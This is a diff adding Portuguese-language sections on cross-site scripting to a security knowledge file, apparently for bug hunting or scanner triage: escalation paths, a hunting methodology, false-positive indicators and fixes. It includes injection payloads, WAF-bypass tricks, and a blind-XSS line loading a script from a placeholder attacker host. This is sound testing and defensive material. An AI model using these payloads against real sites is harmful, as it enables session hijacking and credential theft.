@@ -127,6 +127,54 @@ Casos reais e mentalidade de ataque (RWBH): Twitter (stored XSS em perfis/tweets
 
 **Fontes**: CVE List v5 (cvelistV5), NVD, advisories dos vendors.
 
+## Escalation Techniques
+XSS raramente é o fim -- é o vetor inicial para ataques de maior impacto:
+
+- **Account takeover:** roubo de cookies de sessão (se não `HttpOnly`) ou tokens em `localStorage` via `document.cookie` / `localStorage.getItem()`. O atacante hijacka a sessão da vítima.
+- **CSRF bypass:** scripts executados via XSS leem tokens CSRF embutidos na página e submetem requisições autenticadas em nome da vítima, contornando qualquer proteção anti-CSRF.
+- **Phishing via domínio confiável:** o atacante altera dinamicamente a página (DOM manipulation) para exibir formulário de login falso no domínio legítimo. A vítima confia na URL e entrega credenciais.
+- **Keylogging e exfiltração:** `addEventListener('keydown', ...)` captura tudo que a vítima digita na página infectada e envia para servidor do atacante.
+- **Pivot para RCE:** stored XSS em logs/painel admin pode executar scripts no contexto de administradores -- permitindo upload de shell, criação de usuários, ou acesso a funcionalidades de execução remota.
+- **Encadeamento com Open Redirect:** XSS em domínio com Open Redirect permite roubo de tokens OAuth redirecionando o callback para servidor do atacante.
+- **Worm XSS:** stored XSS auto-replicante (ex: mensagem que injeta payload no perfil de quem visualiza) pode comprometer toda a base de usuários em cascata.
+
+Ao avaliar impacto, considere: quem é o público afetado (admin vs usuário comum), quais dados são acessíveis na página, e se o XSS pode ser encadeado com outras vulnerabilidades.
+
+## Hunting Methodology
+Processo passo a passo para identificar XSS:
+
+1. **Identificar pontos de entrada:** buscar campos de input, parâmetros de URL, fragmentos (`#`), pathnames, e headers que são refletidos na resposta. Não se limitar a campos de texto -- dropdowns e campos numéricos podem ser manipulados via proxy.
+2. **Injetar canary:** inserir string única (ex: `xsstestABC123`) em cada ponto de entrada e verificar se aparece no source da página retornada. Usar View Source + Ctrl+F para localizar.
+3. **Determinar o contexto de reflexão:** o canary aparece dentro de:
+   - HTML body (`<p>CANARY</p>`) -- testar tags como `<script>`, `<img onerror>`.
+   - Atributo HTML (`value="CANARY"`) -- fechar aspas e injetar handler (`" onfocus=alert(1) x="`).
+   - Bloco `<script>` (`var x='CANARY'`) -- fechar string e injetar JS (`'; alert(1)//`).
+   - URL (`href="CANARY"`) -- usar `javascript:` ou `data:` scheme.
+   - JSON/API response -- **não é superfície HTML**, reflexão aqui não é XSS.
+4. **Fechar tags anteriores:** se o input está dentro de um `<img>`, fechar com `"/>` antes de abrir `<script>`. Sintaxe incorreta impede execução.
+5. **Testar payloads progressivos:** começar com payload genérico, escalar para polyglot se filtros bloquearem. Usar `fromCharCode()` para contornar filtros de aspas.
+6. **Confirmar execução:** payload gerou alert/redirect? Sem execução confirmada, o finding é potencial, não confirmado. Verificar no console do browser por erros de sintaxe.
+7. **Blind XSS:** para inputs que não refletem na mesma página (logs, admin panels, tickets), usar payload que faz request para servidor próprio (`<script src=//attacker/x.js>`) e monitorar logs.
+8. **Bypass de proteções:** se WAF ou filtro bloqueia, tentar:
+   - Capitalização alternada (`<ScRiPt>`).
+   - Encoding (`%3Cscript%3E`, double-encode, unicode).
+   - Tags alternativas (`<svg onload>`, `<body onload>`, `<details ontoggle>`).
+   - Schemes especiais (`javascript:`, `data:`).
+
+## False Positive Indicators
+Sinais de que a reflexão detectada pelo scanner **não é XSS explorável**:
+
+- **Reflexão em JSON/RSC flight data:** `<` é escape JSON, não `<` no DOM. Frameworks como Next.js serializam searchParams em RSC payload com unicode escapes -- o browser nunca interpreta como HTML.
+- **Resposta HTTP 404:** páginas de erro genéricas (ex: `/_not-found` do Next.js) refletem parâmetros da URL no body, mas não são superfície de ataque válida. O scanner deve filtrar respostas non-2xx.
+- **Content-Type não-HTML:** respostas `application/json`, `text/plain`, `text/x-component` (RSC) não são renderizadas como HTML pelo browser. Reflexão nelas não é XSS.
+- **Framework com autoescape:** React (JSX), Angular, Vue e Thymeleaf escapam output por padrão. XSS nesses frameworks exige uso explícito de `dangerouslySetInnerHTML`/`v-html`/`th:utext`.
+- **CSP restritiva:** `Content-Security-Policy` com `nonce` ou `strict-dynamic` sem `unsafe-inline` bloqueia execução de scripts injetados, mesmo que a reflexão ocorra em HTML.
+- **Reflexão dentro de `<script>` com dados JSON:** ex: `<script>var config = {"q": "PAYLOAD"};</script>` -- o payload está em contexto JavaScript string, não HTML. Precisa de escape de string JS (`'; alert(1)//`), não de tag HTML.
+- **Canary presente, mas marker ausente:** se o canary alfanumérico reflete mas o payload com `<`/`>` não aparece no body (ou aparece encoded), a aplicação está escapando corretamente.
+- **Mesmo comportamento com baseline:** se a resposta para input benigno já contém o padrão detectado, é coincidência, não reflexão.
+
+**Caso real (prostaff.gg):** scanner reportou 3 XSS CRITICAL em `/search`, `/filter`, `/api/search`. Validação revelou: todas retornavam 404, reflexão era em RSC flight data com `<`, CSP tinha `nonce + strict-dynamic`. Zero dos findings era explorável.
+
 ## Recommendation
 1. Codificar a saída conforme o contexto (HTML entity, attribute, JavaScript, URL, CSS) usando funções nativas do framework.
 2. Nunca inserir entrada do usuário em `innerHTML`, `document.write`, `eval`, `Function`, `setTimeout(string)`; usar `textContent` e APIs seguras.
